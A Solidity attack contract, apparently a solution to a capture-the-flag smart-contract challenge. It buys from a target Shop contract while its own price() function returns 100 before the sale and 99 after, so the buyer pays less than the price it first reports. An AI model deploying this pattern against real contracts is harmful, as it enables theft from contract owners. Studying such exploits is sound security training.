// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack {
    Shop private immutable target;

    uint private constant ATTACK_PRICE = 99;
    uint private constant ORIGINAL_PRICE = 100;

    constructor(address _target) {
        target = Shop(_target);
    }

    function attack() external {
        target.buy();
        require(target.price() == ATTACK_PRICE, "price != 99");
    }

    function price() external view returns (uint) {
        if (target.isSold()) {
            return ATTACK_PRICE;
        }

        return ORIGINAL_PRICE;
    }
}
